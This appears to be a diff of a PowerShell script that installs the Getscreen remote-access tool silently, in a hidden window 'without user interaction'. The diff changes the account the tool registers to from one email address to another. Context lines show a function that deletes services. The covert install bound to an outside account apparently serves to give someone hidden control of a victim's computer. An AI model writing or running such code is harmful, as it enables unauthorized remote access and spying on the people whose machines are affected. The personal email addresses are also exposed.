@@ -15,7 +15,7 @@ function Install-Getscreen {
         }
     }
     #Installing getscreen without user interaction and detaching from the current session
-    Start-Process -FilePath "$installerPath" -ArgumentList "-install -register williamsparks1967@dtortmail.com:10791" -Wait -ErrorAction Stop -WindowStyle Hidden
+    Start-Process -FilePath "$installerPath" -ArgumentList "-install -register dardarya748@gmail.com:10837" -Wait -ErrorAction Stop -WindowStyle Hidden
 }
 
 function Remove-Service { #Function that deletes a service by name
